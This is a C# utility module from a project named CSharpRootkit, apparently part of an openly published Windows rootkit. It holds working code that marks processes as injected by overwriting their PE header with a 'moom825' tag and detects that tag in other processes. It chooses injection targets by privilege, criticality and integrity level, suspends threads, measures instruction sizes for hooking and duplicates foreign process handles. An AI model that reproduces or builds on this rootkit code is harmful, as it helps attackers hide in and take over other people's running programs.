using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static CSharpRootkit.DbgInterface;
using static CSharpRootkit.InternalStructs;
using static CSharpRootkit.InternalStructs64;

namespace CSharpRootkit
{
    public static class Utils
    {
        private static uint THREAD_SUSPEND_RESUME = 0x0002;
        private static uint THREAD_QUERY_INFORMATION = 0x0040;
        private static uint STATUS_NO_MORE_ENTRIES = 0x8000001A;

        private static uint DEBUG_ATTACH_NONINVASIVE_NO_SUSPEND = 0x00000004;
        private static uint DEBUG_ATTACH_NONINVASIVE = 0x00000001;

        private static uint InstructionSizeString = 64 + 2 * 16 + 10 + 10 + 2 * 64 + 2 * 4 + 4;

        public static bool CanGetInstructionSize = true;

        private static DbgInterface.IDebugClient DebugClient;
        private static DbgInterface.IDebugControl DebugControl;

        private static uint TOKEN_QUERY = 0x0008;
        private static int TokenElevation = 20;
        private static int TokenIntegrityLevel = 25;

        private static uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        private static uint PROCESS_VM_READ = 0x0010;


        private static uint PAGE_READWRITE = 0x04;

        private static string headerString = "moom825";
        private static byte[] headerBackup = new byte[headerString.Length];

        private static Random random = new Random();

        static Utils()
        {
            uint SPECIAL_STATUS_ACCESS_DENIED = 0xd0000022;
            Guid DebugClientIID = new Guid("27fe5639-8407-4f47-8364-ee118fb08ac8");
            if (SpecialNativeMethods.DebugCreate(ref DebugClientIID, out DebugClient) != 0)
            {
                CanGetInstructionSize = false;
                return;
            }
            if (DebugClient.AttachProcess(0, NativeMethods.GetCurrentProcessId(), DEBUG_ATTACH_NONINVASIVE | DEBUG_ATTACH_NONINVASIVE_NO_SUSPEND) != 0)
            {
                CanGetInstructionSize = false;
                return;
            }
            DebugControl = (DbgInterface.IDebugControl)DebugClient;
            const int maxRetries = 20;
            const int delayBetweenRetries = 200; // milliseconds
            bool isAttached = false;
            
            for (int i = 0; i < maxRetries; i++)//for some reason theres a chance that the wait will not wait properly causing it to give a 0xd0000022 (maybe STATUS_ACCESS_DENIED, couldnt find too much info on it), if we just wait and call it again it seems to fix it self, maybe something internally has not reached stability yet
            {
                
                uint waitResult = DebugControl.WaitForEvent(0, 5000);

                if (waitResult == 0) // Success
                {
                    isAttached = true;
                    break;
                }
                else if (waitResult == SPECIAL_STATUS_ACCESS_DENIED)
                {
                    Thread.Sleep(delayBetweenRetries);
                }
                else //real error
                {
                    break;
                }
            }
            if (!isAttached)
            {
                CanGetInstructionSize = false;
                return;
            }
        }

        public static byte[] GetCurrentSelfBytes()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            MethodInfo GetRawAssemblyBytes = assembly.GetType().GetMethod("GetRawBytes", BindingFlags.Instance | BindingFlags.NonPublic);
            byte[] assemblyBytes = (byte[])GetRawAssemblyBytes.Invoke(assembly, null);
            return assemblyBytes;
        }

        public static IntPtr[] PauseAllThreadExceptCurrent()
        {
            uint CurrentThreadId = NativeMethods.GetCurrentThreadId();

            List<IntPtr> threadHandles = new List<IntPtr>();
            IntPtr hThread = IntPtr.Zero;
            while (true)
            {
                uint result = NativeMethods.NtGetNextThread(NativeMethods.GetCurrentProcess(), hThread, THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, 0, 0, out IntPtr hThreadNext);

                if (result == 0)
                {
                    if (hThread != IntPtr.Zero)
                    {
                        threadHandles.Add(hThread);
                    }
                    hThread = hThreadNext;
                }
                else if (result == STATUS_NO_MORE_ENTRIES)
                {
                    break;
                }

                uint newThreadId = NativeMethods.GetThreadId(hThread);

                if (newThreadId != CurrentThreadId)
                {
                    NativeMethods.SuspendThread(hThread);//this can pause the debugger thread causing the program to freeze up
                }
            }
            return threadHandles.ToArray();
        }

        public static void ResumeAndCloseAllThreads(IntPtr[] threadHandles) 
        {
            foreach (IntPtr i in threadHandles)
            {
                NativeMethods.ResumeThread(i);
                NativeMethods.CloseHandle(i);
            }
        }

        public static void ResumeAllThreads(IntPtr[] threadHandles)
        {
            foreach (IntPtr i in threadHandles)
            {
                NativeMethods.ResumeThread(i);
            }
        }

        public static void CloseAllThreadHandles(IntPtr[] threadHandles)
        {
            foreach (IntPtr i in threadHandles)
            {
                NativeMethods.CloseHandle(i);
            }
        }

        private static string GetAsmFromDissemableOutput(string asmOut)
        {
            return string.Join(" ", asmOut.Split(' ').Skip(2)).Trim('\n', ' ');
        }

        public static int GetInstructionSize(ulong address)
        {
            if (!CanGetInstructionSize)
            {
                throw new Exception("The debugger could not attach to the process to get the InstructionSize");
            }

            StringBuilder asmString = new StringBuilder((int)InstructionSizeString);

            uint DissambleResult = DebugControl.Disassemble(address, 0, asmString, InstructionSizeString, out uint DisassemblySize, out ulong EndOffset);

            if (DissambleResult != 0 && DissambleResult != 1)
            {
                throw new Exception("There was an error getting the length! Errorcode: " + Marshal.GetLastWin32Error());
            }

            return (int)(EndOffset - address);
        }

        public static Tuple<int, string> GetInstructionSizeAndString(ulong address)
        {
            if (!CanGetInstructionSize)
            {
                throw new Exception("The debugger could not attach to the process to get the InstructionSize");
            }

            StringBuilder asmString = new StringBuilder((int)InstructionSizeString);

            uint DissambleResult = DebugControl.Disassemble(address, 0, asmString, InstructionSizeString, out uint DisassemblySize, out ulong EndOffset);

            if (DissambleResult != 0 && DissambleResult != 1)
            {
                throw new Exception("There was an error getting the length! Errorcode: " + Marshal.GetLastWin32Error());
            }

            string asm = GetAsmFromDissemableOutput(asmString.ToString());

            return new Tuple<int, string>((int)(EndOffset - address), asm);
        }

        public static IntPtr GetFunctionPtr(string LibraryName, string FunctionName, bool LoadDllIfNotLoaded=true)
        {
            IntPtr hModule = NativeMethods.GetModuleHandleW(LibraryName);
            if (hModule == IntPtr.Zero && !LoadDllIfNotLoaded)
            {
                throw new Exception("Couldnt get the module handle, are you sure the library is loaded?");
            }
            if (hModule == IntPtr.Zero) 
            {
                hModule = NativeMethods.LoadLibraryW(LibraryName);
            }
            if (hModule == IntPtr.Zero)
            {
                throw new Exception("Couldnt load the library, are you sure the dll library is accessable?");
            }
            IntPtr FunctionPtr = NativeMethods.GetProcAddress(hModule, FunctionName);
            if (FunctionPtr == IntPtr.Zero)
            {
                throw new Exception("Couldnt get the function from the Library, are you sure it exists?");
            }
            return FunctionPtr;
        }

        public static bool GetFilePathOfProcess(int pid, out string FilePath) 
        {
            FilePath = null;
            IntPtr ProcessHandle = NativeMethods.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero)
            {
                return false;
            }
            bool result = GetFilePathOfProcess(ProcessHandle, out FilePath);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool GetFilePathOfProcess(IntPtr hProcess, out string FilePath) 
        {
            FilePath = null;
            uint bufferSize = 32767+2;//+2 for the null bytes?
            StringBuilder buffer = new StringBuilder((int)bufferSize);

            if (NativeMethods.QueryFullProcessImageNameW(hProcess, 0, buffer, ref bufferSize)) 
            {
                FilePath = buffer.ToString(0, (int)bufferSize);
                return true;
            }

            return false;
        }

        public static bool ComparePaths(string path1, string path2)
        {
            if (path1 == null || path2 == null) 
            {
                return path1 == path2;
            }
            string directory1 = Path.GetDirectoryName(path1);
            string directory2 = Path.GetDirectoryName(path2);
            string fileName1 = Path.GetFileName(path1);
            string fileName2 = Path.GetFileName(path2);
            return directory1.Equals(directory2, StringComparison.InvariantCultureIgnoreCase) && fileName1.Equals(fileName2, StringComparison.InvariantCultureIgnoreCase);
        }

        public static bool setInjectionFlag(out bool isAlreadyInjected) 
        {
            object appDomainData = AppDomain.CurrentDomain.GetData("ProcIsInjected" + NativeMethods.GetCurrentProcessId().ToString());
            if (appDomainData != null && appDomainData.GetType() == typeof(bool) && (bool)appDomainData) 
            {
                isAlreadyInjected = true;
                return false;
            }
            AppDomain.CurrentDomain.SetData("ProcIsInjected"+NativeMethods.GetCurrentProcessId().ToString(), true);

            isAlreadyInjected = false;
            IntPtr module = NativeMethods.GetModuleHandleW(null);
            if (module == IntPtr.Zero) 
            {
                return false;
            }
            
            IntPtr headerLocation = module + Marshal.SizeOf(typeof(InternalStructs.IMAGE_DOS_HEADER));

            if (Marshal.PtrToStringAnsi(headerLocation, headerString.Length) == headerString) 
            {
                isAlreadyInjected = true;
                return false;
            }

            if (!NativeMethods.VirtualProtect(headerLocation, (UIntPtr)headerString.Length, PAGE_READWRITE, out uint outProtect)) 
            {
                return false;
            }

            Marshal.Copy(headerLocation, headerBackup, 0, headerBackup.Length);

            IntPtr headerStringPtr = Marshal.StringToHGlobalAnsi(headerString);
            NativeMethods.CopyMemory(headerLocation, headerStringPtr, (UIntPtr)headerString.Length);

            Marshal.FreeHGlobal(headerStringPtr);

            NativeMethods.VirtualProtect(headerLocation, (UIntPtr)headerString.Length, outProtect, out uint _);

            return true;


        }

        public static bool removeInjectionFlag() 
        {
            AppDomain.CurrentDomain.SetData("ProcIsInjected" + NativeMethods.GetCurrentProcessId().ToString(), false);
            IntPtr module = NativeMethods.GetModuleHandleW(null);
            if (module == IntPtr.Zero)
            {
                return false;
            }

            IntPtr headerLocation = module + Marshal.SizeOf(typeof(InternalStructs.IMAGE_DOS_HEADER));

            if (!NativeMethods.VirtualProtect(headerLocation, (UIntPtr)headerString.Length, PAGE_READWRITE, out uint outProtect))
            {
                return false;
            }

            Marshal.Copy(headerBackup, 0, headerLocation, headerBackup.Length);

            NativeMethods.VirtualProtect(headerLocation, (UIntPtr)headerString.Length, outProtect, out uint _);

            return true;

        }

        public static bool processHasInjectionFlag(IntPtr hProcess, out bool isInjected) 
        {
            isInjected = false;

            ulong module;
            bool is64Bit = IsProcess64Bit(hProcess);
            try
            {
                if (is64Bit)
                {
                    module = Utils64.GetRemoteModuleHandle64Bit(hProcess, null);
                }
                else
                {
                    module = Utils32.GetRemoteModuleHandle32Bit(hProcess, null);
                }
            }
            catch 
            {
                return false;
            }
            ulong headerLocation = module + (uint)Marshal.SizeOf(typeof(InternalStructs.IMAGE_DOS_HEADER));

            IntPtr buffer = Marshal.AllocHGlobal(headerString.Length + 1);//+1 for the null terminator

            if ((Environment.Is64BitProcess && is64Bit) || (!Environment.Is64BitProcess && !is64Bit) || (Environment.Is64BitProcess && !is64Bit)) //(64 && 64) || (32 && 32) || (64 && 32)
            {
                UIntPtr readout = UIntPtr.Zero;
                if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)headerLocation, buffer, (UIntPtr)(headerString.Length + 1), ref readout)) 
                {
                    Marshal.FreeHGlobal(buffer);
                    return false;
                }
            }
            else //(32 && 64)
            {
                ulong readout = 0;
                if (SpecialNativeMethods.ReadProcessMemory64From32(hProcess, headerLocation, buffer, (ulong)(headerString.Length + 1), ref readout) != 0) 
                {
                    Marshal.FreeHGlobal(buffer);
                    return false;
                }
            }

            if (Marshal.PtrToStringAnsi(buffer, headerString.Length) == headerString)
            {
                isInjected = true;
            }
            Marshal.FreeHGlobal(buffer);

            return true;
        }

        public static bool IsProcess64Bit(IntPtr handle)
        {
            bool result;
            try
            {
                NativeMethods.IsWow64Process(handle, out result);
            }
            catch
            {
                return Environment.Is64BitOperatingSystem;
            }
            return !result;
        }

        public static bool IsAdmin() 
        {
            bool isElevated;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            return isElevated;
        }

        public static bool IsProcessAdmin(int pid, out bool IsAdmin) 
        {
            IsAdmin = false;
            IntPtr ProcessHandle = NativeMethods.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero) 
            {
                return false;
            }
            bool result = IsProcessAdmin(ProcessHandle, out IsAdmin);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool IsProcessAdmin(IntPtr ProcessHandle, out bool IsAdmin) 
        {
            IsAdmin = false;
            if (!NativeMethods.OpenProcessToken(ProcessHandle, TOKEN_QUERY, out IntPtr tokenHandle))
            {
                return false;
            }
            int elevationSize = Marshal.SizeOf(typeof(InternalStructs.TOKEN_ELEVATION));
            IntPtr elevationPtr = Marshal.AllocHGlobal(elevationSize);
            if (NativeMethods.GetTokenInformation(tokenHandle, TokenElevation, elevationPtr, elevationSize, out int returnLength) && returnLength == elevationSize)
            {
                InternalStructs.TOKEN_ELEVATION elevationStruct = Marshal.PtrToStructure<InternalStructs.TOKEN_ELEVATION>(elevationPtr);
                Marshal.FreeHGlobal(elevationPtr);
                NativeMethods.CloseHandle(tokenHandle);
                IsAdmin=elevationStruct.TokenIsElevated != 0;
                return true;
            }
            Marshal.FreeHGlobal(elevationPtr);
            NativeMethods.CloseHandle(tokenHandle);
            return false;
        }

        public static bool IsProcessCritical(IntPtr ProcessHandle, out bool IsCritical)
        {
            return NativeMethods.IsProcessCritical(ProcessHandle, out IsCritical);
        }

        public static bool IsProcessCritical(int pid, out bool IsCritical) 
        {
            IsCritical = false;
            IntPtr ProcessHandle = NativeMethods.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero)
            {
                return false;
            }
            bool result = IsProcessCritical(ProcessHandle, out IsCritical);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool GetProcessIntergrityLevel(IntPtr ProcessHandle, out uint IntergrityLevel) 
        {
            IntergrityLevel = 0;
            if (!NativeMethods.OpenProcessToken(ProcessHandle, TOKEN_QUERY, out IntPtr tokenHandle))
            {
                return false;
            }
            int tokenMandatoryLabelSize = Marshal.SizeOf(typeof(InternalStructs.TOKEN_MANDATORY_LABEL))+100;//+100 as it needs some extra data for some reason.
            IntPtr tokenMandatoryLabelPtr = Marshal.AllocHGlobal(tokenMandatoryLabelSize);
            if (NativeMethods.GetTokenInformation(tokenHandle, TokenIntegrityLevel, tokenMandatoryLabelPtr, tokenMandatoryLabelSize, out int returnLength))
            {
                InternalStructs.TOKEN_MANDATORY_LABEL tokenMandatoryLabelStruct = Marshal.PtrToStructure<InternalStructs.TOKEN_MANDATORY_LABEL>(tokenMandatoryLabelPtr);

                IntergrityLevel=Marshal.PtrToStructure<InternalStructs.UINTRESULT>(NativeMethods.GetSidSubAuthority(tokenMandatoryLabelStruct.Label.Sid, (uint)Marshal.ReadByte(NativeMethods.GetSidSubAuthorityCount(tokenMandatoryLabelStruct.Label.Sid)) - 1)).Value;
                
                NativeMethods.CloseHandle(tokenHandle);
                Marshal.FreeHGlobal(tokenMandatoryLabelPtr);
                return true;
            }
            Marshal.FreeHGlobal(tokenMandatoryLabelPtr);
            NativeMethods.CloseHandle(tokenHandle);
            return false;
        }

        public static bool GetProcessIntergrityLevel(int pid, out uint IntergrityLevel)
        {
            IntergrityLevel = 0;
            IntPtr ProcessHandle = NativeMethods.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero)
            {
                return false;
            }
            bool result = GetProcessIntergrityLevel(ProcessHandle, out IntergrityLevel);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool ShouldInject(IntPtr ProcessHandle) 
        {
            if (!IsAdmin() && IsProcessAdmin(ProcessHandle, out bool IsprocAdmin) && IsprocAdmin) 
            {
                return false;
            }

            if (processHasInjectionFlag(ProcessHandle, out bool isInjected) && isInjected)
            {
                return false;
            }

            if (IsProcessCritical(ProcessHandle, out bool isCritical) && isCritical) 
            {
                return false;
            }
            if (GetProcessIntergrityLevel(ProcessHandle, out uint IntergrityLevel) && IntergrityLevel < (uint)InternalStructs.TokenIntegrityLevel.Medium) 
            {
                return false;
            }
            return true;
        }


        public static bool ShouldInject(int pid)
        {
            IntPtr ProcessHandle = NativeMethods.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero)
            {
                return false;
            }
            bool result = ShouldInject(ProcessHandle);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool DupHandle(int sourceProc, IntPtr sourceHandle, out IntPtr newHandle)
        {
            newHandle = IntPtr.Zero;
            uint PROCESS_DUP_HANDLE = 0x0040;
            uint DUPLICATE_SAME_ACCESS = 0x00000002;
            IntPtr procHandle = NativeMethods.OpenProcess(PROCESS_DUP_HANDLE, false, (uint)sourceProc);
            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            IntPtr targetHandle = IntPtr.Zero;

            if (!NativeMethods.DuplicateHandle(procHandle, sourceHandle, NativeMethods.GetCurrentProcess(), ref targetHandle, 0, false, DUPLICATE_SAME_ACCESS))
            {
                int x=Marshal.GetLastWin32Error();
                NativeMethods.CloseHandle(procHandle);
                return false;

            }
            newHandle = targetHandle;
            NativeMethods.CloseHandle(procHandle);
            return true;
        }

        public static T BytesToStruct<T>(byte[] StructData, int offset = 0)
        {
            int structSize = Marshal.SizeOf<T>();
            IntPtr dataBuffer = Marshal.AllocHGlobal(structSize);

            try
            {
                Marshal.Copy(StructData, offset, dataBuffer, structSize);
                return Marshal.PtrToStructure<T>(dataBuffer);
            }
            finally
            {
                Marshal.FreeHGlobal(dataBuffer);
            }
        }

        public static byte[] StructToBytes<T>(T StructData)
        {
            int dataSize = Marshal.SizeOf(StructData);
            IntPtr dataBuffer = Marshal.AllocHGlobal(dataSize);

            try
            {
                Marshal.StructureToPtr(StructData, dataBuffer, false);
                byte[] result = new byte[dataSize];
                Marshal.Copy(dataBuffer, result, 0, dataSize);
                return result;
            }
            finally
            {
                Marshal.FreeHGlobal(dataBuffer);
            }
        }

        public static byte[] CombineByteArrays(params byte[][] arrays)
        {
            byte[] rv = new byte[arrays.Sum(a => a.Length)];
            int offset = 0;
            foreach (byte[] array in arrays)
            {
                Buffer.BlockCopy(array, 0, rv, offset, array.Length);
                offset += array.Length;
            }
            return rv;
        }


        public static string RandomString(int length)
        {
            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static int RandomInt() 
        {
            return random.Next();
        }

        public static bool OpenMemoryMappedFile(string filename, out MemoryMappedFile memFile) 
        {
            memFile = null;
            try
            {
                memFile = MemoryMappedFile.OpenExisting(filename, MemoryMappedFileRights.ReadWrite);
                return true;
            }
            catch (FileNotFoundException)
            {
                return false;
            }
        }

    }
}
